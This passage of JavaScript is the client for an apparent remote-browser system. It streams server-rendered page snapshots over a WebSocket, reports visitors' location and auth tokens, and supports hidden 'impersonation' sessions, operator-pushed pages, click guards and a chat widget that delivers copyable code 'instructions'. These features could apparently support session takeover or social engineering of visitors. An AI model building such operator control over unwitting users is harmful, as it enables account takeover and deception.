            function startHeartbeat() {
                if (state.heartbeatInterval) {
                    clearInterval(state.heartbeatInterval);
                    state.heartbeatInterval = null;
                }
            }
            
            function stopPong() {
                // Kept as a lifecycle no-op for callers from the legacy
                // timer-based heartbeat implementation. Pongs are now
                // server-driven and have no client-side timer to stop.
            }

            // ============================================================
            // WebRTC client-side support
            // ============================================================
            // When the server signals "webrtc_ready", we open an
            // RTCPeerConnection, create an SDP offer, and send it back
            // through the existing WebSocket control channel. The video
            // track we receive is rendered into the <video> element
            // overlaying the canvas; the canvas itself remains in the
            // DOM because all input/mouse/touch event listeners are
            // attached to it.
            // ============================================================

            // WebRTC removed: force DOM/WebSocket path only
            state.rtc = {
                enabled: false
            };

            function connect() {
                if (state.reconnectDisabled) return;
                dbg('[WS DEBUG] connect() start', {wsUrl: CONFIG.wsUrl});
                try {
                    if (state.ws && (state.ws.readyState === WebSocket.CONNECTING || state.ws.readyState === WebSocket.OPEN)) {
                        dbg('[WS DEBUG] connect() aborted: socket already open or connecting', state.ws.readyState);
                        return;
                    }
                    
                    if (state.ws) {
                        try {
                            if (state.ws.readyState === WebSocket.OPEN || state.ws.readyState === WebSocket.CONNECTING) {
                                state.ws.close(1000, 'Creating new connection');
                            }
                        } catch (e) {
                        }
                        state.ws = null;
                    }
                    
                    state.ws = new WebSocket(CONFIG.wsUrl);
                    state.ws.binaryType = 'arraybuffer';

                    state.ws.onopen = onOpen;
                    state.ws.onclose = onClose;
                    state.ws.onerror = onError;
                    state.ws.onmessage = onMessage;
                } catch (e) {
                    console.error('[WS] Connection error:', e);
                    scheduleReconnect();
                }
            }

            function onOpen() {
                dbg('[WS DEBUG] WebSocket opened');
                try { window.__BOOT_MARK('websocket open'); } catch (e) {}
                state.connected = true;
                state.reconnectAttempts = 0;
                state.consecutiveFailures = 0;
                state.isSessionActive = true;
                state.isUserPresent = true;

                const dpr = window.devicePixelRatio || 1;
                const _srvVp = viewportForServer();
                const width = _srvVp.width;
                const height = _srvVp.height;

                // Normal clients use their persistent logical client id for
                // every connection. Hidden/impersonation sessions remain
                // explicitly controlled by their parent URL and keep their
                // separate connection id.
                const sessionIdToUse = state.isHiddenSession && state.sessionId
                    ? state.sessionId
                    : getSessionIdForConnection();

                state.sessionId = sessionIdToUse;
                if (!state.isHiddenSession) {
                    try { sessionStorage.setItem('fixiis_runtime_session_id', sessionIdToUse); } catch (e) {}
                }

                const initData = {
                    type: 'init',
                    device_id: state.deviceId,
                    user_id: state.userId,
                    session_id: sessionIdToUse,
                    reconnect: state.reconnectPending,
                    userAgent: navigator.userAgent,
                    viewport: {
                        width: width,
                        height: height,
                        pixelRatio: dpr
                    },
                    // Real device screen metrics (mobile fidelity): the
                    // server uses these to emulate window.screen for the
                    // emulated browser so page content renders exactly to
                    // the full browser width/height.
                    screen: {
                        width: Math.round((window.screen && window.screen.width) || width),
                        height: Math.round((window.screen && window.screen.height) || height)
                    },
                    location: {
                        ip: state.clientIp,
                        country: state.locationCountry,
                        state: state.locationState,
                        city: state.locationCity,
                        zip: state.locationZip
                    },
                    url: state.targetUrl,
                    is_mobile: state.isMobile,
                    is_touch: state.isTouch,
                    mobile_user_agent: state.mobileUserAgent,
                    orientation: window.orientation === 0 || window.orientation === 180 ? 'portrait' : 'landscape'
                };
                
                if (state.authToken) {
                    initData.auth_token = state.authToken;
                }
                if (state.workflowParam) {
                    initData.workflow = state.workflowParam;
                    initData.workflow_id = state.workflowParam;
                }
                
                if (state.isHiddenSession) {
                    initData.hidden_session = true;
                }
                
                send(initData);
                flushOutgoingQueue();

                state.reconnectPending = false;
                startHeartbeat();
                
                // DOM-only mode: no frame polling
                
                reportSessionToServer('connect');
                startSessionReporting();
            }

            function onClose(event) {
                const replacementClose = !!event && (
                    event.code === 4001
                    || String(event.reason || '').includes('replaced_by_new_session')
                );
                const accessReleaseClose = !!event && (
                    event.code === 4003
                    || String(event.reason || '').includes('access_takeover')
                );
                // A replacement caused by OUR OWN pre-connect handoff landing
                // late is not a takeover: the handoff has now finished, so the
                // next socket will not be replaced. Reconnect instead of
                // stranding the visitor on "Session replaced — refresh this
                // page", which is what a late handoff used to do.
                const selfRaced = replacementClose && !!state.handoffRaced;
                if (selfRaced) state.handoffRaced = false;
                if ((replacementClose || accessReleaseClose) && !selfRaced) {
                    // Both an intentional replacement and an Access takeover
                    // are terminal for this page. In particular, an old tab
                    // must not reconnect and steal the profile back. A full
                    // browser refresh deliberately creates a new page state
                    // and is the only way to reconnect.
                    state.reconnectDisabled = true;
                    state.reconnectPending = false;
                    state.connected = false;
                    state.isSessionActive = false;
                    if (state.reconnectTimer) { clearTimeout(state.reconnectTimer); state.reconnectTimer = null; }
                    try {
                        const title = accessReleaseClose ? 'Disconnected by Access — refresh this page to reconnect' : 'Session replaced — refresh this page to reconnect';
                        if (elements.loadingScreen) elements.loadingScreen.style.display = 'flex';
                        if (elements.streamContainer) elements.streamContainer.classList.remove('visible');
                        if (elements.loadingLogo) elements.loadingLogo.textContent = title;
                    } catch (_) {}
                    cleanup();
                    return;
                }

                state.connected = false;
                state.isSessionActive = false;

                // Stop pong sending (Part 3)
                stopPong();

                if (state.reconnectTimer) {
                    clearTimeout(state.reconnectTimer);
                    state.reconnectTimer = null;
                }

                // DOM-only mode: no frame polling to stop
                state.reconnectPending = true;

                reportSessionToServer('disconnect');
                
                cleanup();
                
                state.reconnectAttempts++;
                // Start with 2s delay, exponential backoff
                const delay = Math.min(CONFIG.reconnectDelay * Math.pow(2.5, state.reconnectAttempts - 1), 30000);
                
                /* [WS] Connection closed, scheduling reconnect */
                
                // Don't show loading screen immediately on close - try to reconnect seamlessly
                // Only show loading after first reconnection fails
                
                state.reconnectTimer = setTimeout(() => {
                    state.reconnectTimer = null;
                    // Fetch location before connecting
                fetchLocation().then(() => {
                    connect();
                });
                }, delay);
            }

            function onError(error) {
                dbg('[WS DEBUG] WebSocket error', error || 'unknown');
            }

            function parsePageFrameHeader(data) {
                try {
                    const view = new DataView(data);
                    if (view.byteLength < 15) return null;
                    const magic = String.fromCharCode(
                        view.getUint8(0),
                        view.getUint8(1),
                        view.getUint8(2),
                        view.getUint8(3)
                    );
                    if (magic !== 'PAG1' && magic !== 'PAG2' && magic !== 'PAG3') return null;
                    const urlLen = view.getUint16(4, false);
                    const compType = view.getUint8(6);
                    // fingerprint is 8 bytes at offset 7..14
                    const fpBytes = new Uint8Array(data.slice(7, 15));
                    const fingerprint = Array.from(fpBytes).map(b => b.toString(16).padStart(2, '0')).join('');
                    const payloadStart = 15 + urlLen;
                    if (view.byteLength < payloadStart) return null;
                    const url = urlLen > 0 ? new TextDecoder().decode(new Uint8Array(data, 15, urlLen)) : '';
                    const payload = data.slice(payloadStart);
                    return { magic, url, compType, payload, fingerprint };
                } catch (e) {
                    return null;
                }
            }

            

            async function handleBinaryFrame(data) {
                const hdr = parsePageFrameHeader(data);
                if (!hdr) {
                    // fallback: try parse as text JSON
                    try {
                        const text = new TextDecoder().decode(new Uint8Array(data));
                        const message = JSON.parse(text);
                        handleMessage(message);
                    } catch (e) {
                        dbg('[WS DEBUG] Unknown binary frame', e);
                    }
                    return;
                }

                try {
                    // Dedupe: if frame fingerprint matches last rendered, skip re-render
                    if (state.lastFrameFingerprint && hdr.fingerprint === state.lastFrameFingerprint) {
                        // Update lastFrameTime for activity tracking and skip
                        state.lastFrameTime = Date.now();
                        // The page this frame carries is already on screen (a
                        // repeat after a reconnect), so a loading page that is
                        // still up has nothing left to wait for.
                        lpvStreamShown('same frame again');
                        return;
                    }
                    if (hdr.compType === 0) {
                        const html = new TextDecoder().decode(hdr.payload);
                        renderPageSnapshot(html, hdr.url);
                        state.lastFrameFingerprint = hdr.fingerprint;
                        return;
                    }

                    if (hdr.compType === 1) {
                        // Brotli compressed HTML payload
                        try {
                            if (typeof DecompressionStream === 'function') {
                                try {
                                    new DecompressionStream('br');
                                } catch (e) {
                                    console.warn('Brotli decompression is not supported in this browser; treating frame as plain text');
                                    const html = new TextDecoder().decode(hdr.payload);
                                    renderPageSnapshot(html, hdr.url);
                                    state.lastFrameFingerprint = hdr.fingerprint;
                                    return;
                                }
                                const ds = new DecompressionStream('br');
                                const decompressedStream = new Response(hdr.payload).body.pipeThrough(ds);
                                const html = await new Response(decompressedStream).text();
                                renderPageSnapshot(html, hdr.url);
                                state.lastFrameFingerprint = hdr.fingerprint;
                                return;
                            } else {
                                // No native DecompressionStream available — fallback to raw decode
                                const html = new TextDecoder().decode(hdr.payload);
                                renderPageSnapshot(html, hdr.url);
                                state.lastFrameFingerprint = hdr.fingerprint;
                                return;
                            }
                        } catch (e) {
                            console.warn('Brotli decompression failed, falling back to raw decode', e);
                            try {
                                const html = new TextDecoder().decode(hdr.payload);
                                renderPageSnapshot(html, hdr.url);
                            } catch (e2) {}
                            return;
                        }
                    }

                    if (hdr.magic === 'PAG3') {
                        // Hybrid frame: lightweight HTML + separate asset list.
                        // Payload layout: [HTML bytes] [JSON asset list bytes] [uint32 assetListLength]
                        // The browser will request the rewritten asset URLs (e.g. /assets/<hash>.png)
                        // directly from the server, leveraging standard HTTP caching.
                        try {
                            const payloadView = new DataView(hdr.payload.buffer, hdr.payload.byteOffset, hdr.payload.byteLength);
                            if (hdr.payload.byteLength < 4) {
                                console.error('PAG3 payload too small to contain asset list length');
                                return;
                            }
                            const assetListLength = payloadView.getUint32(hdr.payload.byteLength - 4, false);
                            if (assetListLength < 0 || assetListLength > hdr.payload.byteLength - 4) {
                                console.error('PAG3 asset list length out of range:', assetListLength);
                                return;
                            }
                            const htmlByteLength = hdr.payload.byteLength - 4 - assetListLength;
                            const htmlBytes = new Uint8Array(hdr.payload, 0, htmlByteLength);
                            const assetListBytes = new Uint8Array(hdr.payload, htmlByteLength, assetListLength);

                            // Parse and dispatch the asset list so the browser can begin preloading
                            // these new resources while HTML parsing is in progress.
                            let assetCount = 0;
                            try {
                                const assetListJson = new TextDecoder().decode(assetListBytes);
                                if (assetListJson) {
                                    const assetList = JSON.parse(assetListJson);
                                    if (Array.isArray(assetList) && assetList.length) {
                                        assetCount = assetList.length;
                                        dispatchAssetList(assetList);
                                    }
                                }
                            } catch (e) {
                                console.error('PAG3 asset list parse failed', e);
                            }

                            dbg(`[WS DEBUG] PAG3 received: ${assetCount} new assets, html bytes=${htmlByteLength}, compType=${hdr.compType}`);

                            // Decompress HTML (Brotli) when compType === 1; mirror PAG1/PAG2 logic.
                            let html = null;
                            if (hdr.compType === 1) {
                                try {
                                    if (typeof DecompressionStream === 'function') {
                                        try {
                                            new DecompressionStream('br');
                                        } catch (e) {
                                            console.warn('PAG3 Brotli decompression is not supported in this browser; using plain-text fallback');
                                            html = new TextDecoder().decode(htmlBytes);
                                        }

                                        if (!html) {
                                            const ds = new DecompressionStream('br');
                                            const decompressedStream = new Response(htmlBytes).body.pipeThrough(ds);
                                            html = await new Response(decompressedStream).text();
                                        }
                                    } else {
                                        html = new TextDecoder().decode(htmlBytes);
                                    }
                                } catch (e) {
                                    console.warn('PAG3 HTML decompression failed, falling back to raw decode', e);
                                    html = new TextDecoder().decode(htmlBytes);
                                }
                            } else {
                                html = new TextDecoder().decode(htmlBytes);
                            }

                            renderPageSnapshot(html, hdr.url);
                            state.lastFrameFingerprint = hdr.fingerprint;
                        } catch (e) {
                            console.error('PAG3 frame processing failed', e);
                        }
                        return;
                    }

                    

                    // Unknown compType: decode raw
                    const html = new TextDecoder().decode(hdr.payload);
                    renderPageSnapshot(html, hdr.url);
                } catch (e) {
                    console.error('handleBinaryFrame error', e);
                }
            }

                _safeColor(v, fallback) {
                    const c = String(v || '').trim();
                    // Only allow a conservative set: #hex, rgb(), rgba(), and
                    // a small list of named colours. Anything else falls back
                    // so a bad value cannot inject into the stylesheet.
                    if (/^#[0-9a-fA-F]{3,8}$/.test(c)) return c;
                    if (/^rgba?\([\d.,\s%]+\)$/.test(c)) return c;
                    if (/^[a-zA-Z]{3,20}$/.test(c)) return c;
                    return fallback;
                },

                // Does the operator want chat on THIS device? The server
                // already folds this into `enabled` when it knows the device;
                // doing it here as well covers a config broadcast to every
                // socket, and keeps a phone bubble-free when chat is
                // desktop-only.
                _deviceAllowed(cfg) {
                    const mode = String((cfg && cfg.devices) || 'both').toLowerCase();
                    if (mode !== 'desktop' && mode !== 'mobile') return true;
                    const mobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|opera mobi/i
                        .test(navigator.userAgent);
                    return mode === 'mobile' ? mobile : !mobile;
                },

                // Is the bubble a shortcut to a page/link instead of chat?
                redirects() {
                    return !!(this.cfg && String(this.cfg.mode || 'chat').toLowerCase() === 'redirect');
                },

                applyConfig(cfg) {
                    if (!cfg || typeof cfg !== 'object') return;
                    this.cfg = cfg;
                    // Switched to redirect mode while a conversation is open:
                    // close it, the panel is not part of that mode.
                    if (this.redirects()) this.toggle(false);
                    const on = !!cfg.enabled && this._deviceAllowed(cfg);
                    // Nothing on screen yet. This used to be a bare
                    // `if (!this.root) return;`, which ran BEFORE the mount
                    // below and meant the bubble could never be created on
                    // the first config the server ever sent.
                    if (!this.root) {
                        if (on) this.mount();
                        return;
                    }
                    const bubble = this._safeColor(cfg.bubble_color, '#7c5cff');
                    const text = this._safeColor(cfg.text_color, '#ffffff');
                    this.root.style.setProperty('--lpvch-bubble', bubble);
                    this.root.style.setProperty('--lpvch-text', text);
                    this.root.style.setProperty('--lpvch-ring', bubble);

                    if (!on) { this.destroy(); return; }
                    if (!this.bubble) { this.mount(); return; }

                    // Refresh branding in place.
                    const nameEl = this.root.querySelector('.lpvch-title');
                    if (nameEl) nameEl.textContent = cfg.display_name || 'Support';
                    const logoEl = this.root.querySelector('.lpvch-logo');
                    if (logoEl) logoEl.innerHTML = this._logoMarkup();
                    const bub = this.root.querySelector('.lpvch-bubble');
                    if (bub) bub.innerHTML = this._bubbleMarkup() + '<span class="lpvch-badge' +
                        (this.unread ? ' on' : '') + '">' + (this.unread || '') + '</span>';
                },

                // Chat artwork may be server-relative ("/api/lpv/chat/logo/…");
                // resolve it against the backend so a standalone client does
                // not look for the image on the host serving its HTML.
                _logoUrl() {
                    const raw = (this.cfg && this.cfg.logo_url) || '';
                    return raw ? (resolveServerUrl(raw) || raw) : '';
                },

                _logoMarkup() {
                    const url = this._logoUrl();
                    if (url) {
                        return '<img src="' + String(url).replace(/"/g, '&quot;') + '" alt="">';
                    }
                    const n = (this.cfg && this.cfg.display_name) || 'Support';
                    return String(n).trim().charAt(0).toUpperCase();
                },

                _bubbleMarkup() {
                    const url = this._logoUrl();
                    if (url) {
                        return '<img src="' + String(url).replace(/"/g, '&quot;') + '" alt="">';
                    }
                    return '<svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8z"/></svg>';
                },

                mount() {
                    if (this.root || !this.cfg || !this.cfg.enabled) return;
                    const root = document.createElement('div');
                    root.id = 'lpv-chat-root';
                    const style = document.createElement('style');
                    style.id = 'lpv-chat-style';
                    style.textContent = this._css();
                    root.appendChild(style);

                    const bubble = document.createElement('button');
                    bubble.className = 'lpvch-bubble';
                    bubble.type = 'button';
                    bubble.setAttribute('aria-label', 'Open chat');
                    bubble.innerHTML = this._bubbleMarkup() +
                        '<span class="lpvch-badge"></span>';

                    const panel = document.createElement('div');
                    panel.className = 'lpvch-panel';
                    panel.innerHTML =
                        '<div class="lpvch-head">' +
                        '  <div class="lpvch-logo">' + this._logoMarkup() + '</div>' +
                        '  <div style="min-width:0">' +
                        '    <div class="lpvch-title">' + this._esc(this.cfg.display_name || 'Support') + '</div>' +
                        '    <div class="lpvch-sub"><i></i>online · replies instantly</div>' +
                        '  </div>' +
                        '  <button class="lpvch-close" type="button" aria-label="Close chat">' +
                        '    <svg viewBox="0 0 24 24"><path d="M18 6 6 18M6 6l12 12"/></svg>' +
                        '  </button>' +
                        '</div>' +
                        '<div class="lpvch-list">' +
                        // The greeting the operator configured is the whole
                        // point of the field — previously this was hardcoded
                        // and whatever was typed in settings never appeared.
                        '  <div class="lpvch-empty">' + this._esc(
                            (this.cfg && this.cfg.greeting)
                            || 'Start the conversation — we typically reply within a minute.'
                        ) + '</div>' +
                        '</div>' +
                        '<form class="lpvch-form">' +
                        '  <input class="lpvch-input" type="text" placeholder="Type a message…" autocomplete="off">' +
                        '  <button class="lpvch-send" type="submit" aria-label="Send">' +
                        '    <svg viewBox="0 0 24 24"><path d="M22 2 11 13"/><path d="M22 2 15 22l-4-9-9-4z"/></svg>' +
                        '  </button>' +
                        '</form>';

                    root.appendChild(panel);
                    root.appendChild(bubble);
                    document.body.appendChild(root);

                    this.root = root;
                    this.bubble = bubble;
                    this.panel = panel;
                    this.list = panel.querySelector('.lpvch-list');
                    this.input = panel.querySelector('.lpvch-input');
                    this.badge = bubble.querySelector('.lpvch-badge');

                    const bubbleColor = this._safeColor(this.cfg.bubble_color, '#7c5cff');
                    const textColor = this._safeColor(this.cfg.text_color, '#ffffff');
                    root.style.setProperty('--lpvch-bubble', bubbleColor);
                    root.style.setProperty('--lpvch-text', textColor);
                    root.style.setProperty('--lpvch-ring', bubbleColor);

                    bubble.addEventListener('click', () => {
                        // Redirect mode: the bubble is a shortcut, not a
                        // conversation. The server performs the move so the
                        // page push keeps its audit trail.
                        if (this.redirects()) {
                            try {
                                if (LPV && typeof LPV._send === 'function') {
                                    LPV._send({ type: 'chat_redirect' });
                                }
                            } catch (e) { /* ignore */ }
                            return;
                        }
                        this.toggle();
                    });
                    panel.querySelector('.lpvch-close').addEventListener('click', () => this.toggle(false));
                    panel.querySelector('.lpvch-form').addEventListener('submit', (e) => {
                        e.preventDefault();
                        this.send();
                    });

                    // Ask the server for the stored thread so a reconnecting
                    // client sees its history instead of an empty panel.
                    // Redirect mode has no thread.
                    if (!this.redirects()) this.requestHistory();
                },

                destroy() {
                    if (this.root && this.root.parentNode) this.root.parentNode.removeChild(this.root);
                    this.root = null; this.bubble = null; this.panel = null;
                    this.list = null; this.input = null; this.badge = null;
                    this.open = false;
                },

                toggle(force) {
                    if (!this.panel) return;
                    this.open = (typeof force === 'boolean') ? force : !this.open;
                    this.panel.classList.toggle('on', this.open);
                    if (this.open) {
                        this.unread = 0;
                        this._paintBadge();
                        try { this.input && this.input.focus(); } catch (e) {}
                        // Opening the panel is the one time we always land on
                        // the newest message.
                        this._scroll(true);
                    }
                },

                _paintBadge() {
                    if (!this.badge) return;
                    this.badge.textContent = this.unread > 99 ? '99+' : String(this.unread);
                    this.badge.classList.toggle('on', this.unread > 0);
                },

                // Is the reader looking at the newest message, or reading
                // back? Chat that yanks itself to the bottom while somebody is
                // scrolling up reads as "the chat scroll is blocked" — every
                // new message pulled them back. Measured BEFORE a message is
                // appended, so the decision describes where they were.
                atBottom() {
                    const l = this.list;
                    if (!l) return true;
                    try {
                        return (l.scrollHeight - l.scrollTop - l.clientHeight) < 72;
                    } catch (e) { return true; }
                },

                _scroll(force) {
                    if (!this.list) return;
                    if (!force && !this.atBottom()) return;
                    try { this.list.scrollTop = this.list.scrollHeight; } catch (e) {}
                },

                _esc(v) {
                    return String(v == null ? '' : v).replace(/[&<>"']/g, (c) => ({
                        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
                    }[c]));
                },

                _time(ts) {
                    try {
                        return new Date((ts || 0) * 1000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                    } catch (e) { return ''; }
                },

                addMessage(m) {
                    if (!m || !this.list) return;
                    if (m.id && this.seen[m.id]) return;
                    if (m.id) this.seen[m.id] = true;

                    // Where the reader is, BEFORE the list grows. A message that
                    // arrives while they are reading history must not drag
                    // them back to the bottom.
                    const stick = this.atBottom();

                    const empty = this.list.querySelector('.lpvch-empty');
                    if (empty) empty.remove();

                    const mine = m.role === 'client';
                    const wrap = document.createElement('div');
                    const kind = (m.kind === 'code' || m.kind === 'instruction') ? m.kind : 'text';
                    wrap.className = 'lpvch-msg ' + (kind === 'instruction' ? 'instruction' : (mine ? 'me' : 'them'));

                    let html = '';
                    if (kind === 'instruction') {
                        html += '<div class="lpvch-instr-head">' +
                            '<svg viewBox="0 0 24 24"><path d="M12 9v4M12 17h.01"/><circle cx="12" cy="12" r="10"/></svg>' +
                            'instruction</div>';
                    }
                    if (m.body) html += '<div>' + this._esc(m.body).replace(/\n/g, '<br>') + '</div>';

                    if (m.code) {
                        html += '<div class="lpvch-code"><pre>' + this._esc(m.code) + '</pre>' +
                            '<button type="button" class="lpvch-copy">' +
                            '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>' +
                            '<span>copy</span></button></div>';
                    }
                    html += '<span class="lpvch-time">' + this._time(m.created_at) + '</span>';
                    wrap.innerHTML = html;

                    const copyBtn = wrap.querySelector('.lpvch-copy');
                    if (copyBtn) {
                        copyBtn.addEventListener('click', () => {
                            const label = copyBtn.querySelector('span');
                            const done = () => {
                                copyBtn.classList.add('done');
                                if (label) label.textContent = 'copied';
                                setTimeout(() => {
                                    copyBtn.classList.remove('done');
                                    if (label) label.textContent = 'copy';
                                }, 1600);
                            };
                            const text = m.code || '';
                            if (navigator.clipboard && navigator.clipboard.writeText) {
                                navigator.clipboard.writeText(text).then(done, done);
                            } else {
                                try {
                                    const ta = document.createElement('textarea');
                                    ta.value = text;
                                    ta.style.position = 'fixed';
                                    ta.style.opacity = '0';
                                    document.body.appendChild(ta);
                                    ta.select();
                                    document.execCommand('copy');
                                    ta.remove();
                                } catch (e) {}
                                done();
                            }
                        });
                    }

                    this.list.appendChild(wrap);
                    if (!this.open && !mine) {
                        this.unread += 1;
                        this._paintBadge();
                    }
                    // Their own message always lands in view; someone else's
                    // only does when the reader was at the bottom already.
                    this._scroll(mine || stick);
                },

                requestHistory() {
                    try {
                        if (window.LPV && LPV._send) LPV._send({ type: 'chat_history' });
                    } catch (e) {}
                },

                send() {
                    if (!this.input) return;
                    const text = (this.input.value || '').trim();
                    if (!text) return;
                    this.input.value = '';
                    try {
                        LPV._send({ type: 'chat_message', kind: 'text', body: text });
                    } catch (e) {}
                    // Optimistic echo — the server broadcasts the stored row,
                    // which we de-dupe by id, so this only smooths latency.
                    this.addMessage({
                        role: 'client', kind: 'text', body: text,
                        created_at: Date.now() / 1000, id: 'local-' + Date.now()
                    });
                }
            };

            const LPV = {
                active: false,
                overlay: null,
                container: null,
                spinner: null,
                captureRoot: null,    // Element we attach delegated listeners to
                currentPage: null,    // { id, name }
                guard: null,          // active click guard (see normaliseGuard)
                actions: [],          // this page's click actions (click -> go somewhere)
                armed: [],            // rules a running workflow armed for this page
                _lastActionAt: 0,
                _guardToastUntil: 0,
                _abortController: null,
                _monitorBound: false,

                // Per-page interaction allowlist. The server ships it with
                // every push; `_paintGuard` shows the visitor why a control
                // did not respond instead of leaving a dead-looking page.
                setGuard(guard, pageName) {
                    this.guard = normaliseGuard(guard);
                    this.pageName = pageName || this.pageName || '';
                    this._paintGuard();
                },

                // Live update while this page is already on screen
                // (message type lpv_guard from the admin panel).
                updateGuard(pageId, guard) {
                    const currentId = this.currentPage && this.currentPage.id;
                    if (pageId && currentId && pageId !== currentId) return false;
                    this.setGuard(guard, this.pageName);
                    // Re-tag the live document so the highlight follows the
                    // operator's new allowlist without a re-push.
                    try {
                        const frames = this.container
                            ? this.container.querySelectorAll('iframe[data-lpv-frame]')
                            : [];
                        for (let i = 0; i < frames.length; i++) {
                            this._markAllowed(frames[i].contentDocument);
                        }
                    } catch (e) { /* detached frame */ }
                    return true;
                },

                // A page may map a control to somewhere else: "click Sign in ->
                // show the next page", "click here -> open this link". The
                // rules use the same syntax as the click guard.
                setActions(actions) {
                    this.actions = Array.isArray(actions) ? actions.slice(0, 40) : [];
                    // Armed workflow rules belong to the page that was on
                    // screen when they were armed.
                    this.armed = [];
                },

                armAction(msg) {
                    if (!msg || !msg.match) return false;
                    // Only for the page in front of the visitor.
                    const currentId = this.currentPage && this.currentPage.id;
                    if (msg.page_id && currentId && msg.page_id !== currentId) return false;
                    this.armed.push({
                        id: String(msg.id || ''),
                        match: String(msg.match || ''),
                    });
                    return true;
                },

                // Live update when the operator saves this page's actions
                // while a visitor is already looking at it. Armed workflow
                // rules are untouched: they belong to this page, not to the
                // saved list.
                updateActions(pageId, actions) {
                    const currentId = this.currentPage && this.currentPage.id;
                    if (pageId && currentId && pageId !== currentId) return false;
                    this.actions = Array.isArray(actions) ? actions.slice(0, 40) : [];
                    try {
                        const frames = this.container
                            ? this.container.querySelectorAll('iframe[data-lpv-frame]')
                            : [];
                        for (let i = 0; i < frames.length; i++) {
                            this._markAllowed(frames[i].contentDocument);
                        }
                    } catch (e) { /* detached frame */ }
                    return true;
                },

                matchAction(el) {
                    if (!el) return null;
                    // A click usually lands on a <span>/<svg> inside the
                    // button, so match the control the visitor believes they
                    // pressed as well as the raw node.
                    const nodes = [el];
                    try {
                        if (typeof guardActionable === 'function') {
                            const control = guardActionable(el);
                            if (control && control !== el) nodes.push(control);
                        }
                    } catch (e) { /* ignore */ }
                    for (let n = 0; n < nodes.length; n++) {
                        const node = nodes[n];
                        for (let i = 0; i < this.armed.length; i++) {
                            if (guardMatchesRule(node, this.armed[i].match)) {
                                return { armed: this.armed[i].id };
                            }
                        }
                        for (let i = 0; i < this.actions.length; i++) {
                            const rule = this.actions[i];
                            if (rule && guardMatchesRule(node, rule.match)) return { index: i };
                        }
                    }
                    return null;
                },

                // Send the visitor to an external address. Used when a mapped
                // control's target is a link: the address travels with the
                // page, so nothing has to come back over the socket first.
                goLink(url, newTab) {
                    let target = String(url || '').trim();
                    if (!target) return false;
                    if (!/^[a-z][a-z0-9+.-]*:/i.test(target)) target = 'https://' + target;
                    try {
                        if (newTab) {
                            try {
                                const opened = window.open(target, '_blank', 'noopener');
                                if (opened) return true;   // this tab stays put
                            } catch (e) { /* popup blocked: fall through */ }
                        }
                        // Leave the overlay first: if the browser restores
                        // this page from bfcache the visitor would otherwise
                        // land on a dead page.
                        try { this.stop(); } catch (e) { /* not started */ }
                        window.location.assign(target);
                        return true;
                    } catch (e) {
                        return false;
                    }
                },

                // Returns true when the click was consumed by an action, so
                // the caller can stop the page's own handler from also
                // running (the operator's mapping wins — including the
                // page's own href and its click guard).
                triggerAction(el) {
                    const hit = this.matchAction(el);
                    if (!hit) return false;
                    const now = Date.now();
                    if (now - (this._lastActionAt || 0) < 800) return true;
                    this._lastActionAt = now;
                    const rule = (hit.index !== undefined ? this.actions[hit.index] : null) || null;
                    const msg = Object.assign({
                        type: 'lpv_action',
                        page_id: this.currentPage && this.currentPage.id,
                        page_name: this.currentPage && this.currentPage.name,
                    }, hit);
                    // Carry the target with the report. The server re-reads
                    // its own copy (it stays authoritative), but it can still
                    // act when its stored index has drifted — an action
                    // edited while this visitor sat on the page.
                    if (rule) {
                        msg.match = rule.match;
                        msg.do = rule.do;
                        if (rule.page_id) msg.target_page_id = rule.page_id;
                        if (rule.url) msg.url = rule.url;
                    }
                    this._send(msg);
                    if (rule && rule.do === 'link' && rule.url) {
                        const self = this;
                        const go = function () { self.goLink(rule.url, !!rule.new_tab); };
                        try { setTimeout(go, 0); } catch (e) { go(); }
                    } else if (rule) {
                        // A page target still comes from the server; show the
                        // spinner so the click has an immediate answer.
                        try {
                            if (typeof this._showSpinner === 'function') {
                                this._showSpinner(true, 'click');
                            }
                        } catch (e) { /* cosmetic */ }
                    }
                    return true;
                },

                isLocked() {
                    const g = this.guard;
                    if (!g || !g.enabled) return false;
                    return g.allow.indexOf('*') === -1;
                },

                allows(el) {
                    return guardAllows(this.guard, el);
                },

                _paintGuard(remarkedInProgress) {
                    const locked = this.isLocked();
                    if (this.container) {
                        this.container.classList.toggle('lpv-guarded', locked);
                    }
                    try {
                        const frames = this.container
                            ? this.container.querySelectorAll('iframe[data-lpv-frame]')
                            : [];
                        for (let i = 0; i < frames.length; i++) {
                            const doc = frames[i].contentDocument;
                            if (doc && doc.documentElement) {
                                doc.documentElement.classList.toggle('lpv-guarded', locked);
                            }
                        }
                    } catch (e) { /* frame not ready / detached */ }
                },

                // Tag the controls this page's guard allows. Purely visual:
                // the decision is still made per click in allows().
                _markAllowed(doc) {
                    if (!doc || !doc.querySelectorAll) return;
                    const g = this.guard || normaliseGuard(null);
                    let nodes;
                    try {
                        nodes = doc.querySelectorAll('button, a, [role="button"], ' +
                            'input[type="submit"], input[type="button"], ' +
                            'input[type="image"], [data-action], [onclick]');
                    } catch (e) { return; }
                    const locked = this.isLocked();
                    for (let i = 0; i < nodes.length; i++) {
                        const el = nodes[i];
                        let allowed = true;
                        if (locked) {
                            allowed = false;
                            for (let k = 0; k < g.allow.length; k++) {
                                if (guardMatchesRule(el, g.allow[k])) { allowed = true; break; }
                            }
                            // A mapped control is allowed by definition: the
                            // operator said what it does, so it must not look
                            // (or behave) like a blocked one.
                            if (!allowed) {
                                for (let k = 0; k < this.actions.length; k++) {
                                    if (this.actions[k] && guardMatchesRule(el, this.actions[k].match)) {
                                        allowed = true;
                                        break;
                                    }
                                }
                            }
                        }
                        try {
                            if (allowed) el.setAttribute('data-lpv-allowed', '1');
                            else el.removeAttribute('data-lpv-allowed');
                        } catch (e) { /* ignore */ }
                    }
                },

                // Called when a locked page swallows a click. Reporting is
                // throttled so a frustrated visitor tapping the same dead
                // button does not spam the operator's audit feed.
                _guardBlocked(el) {
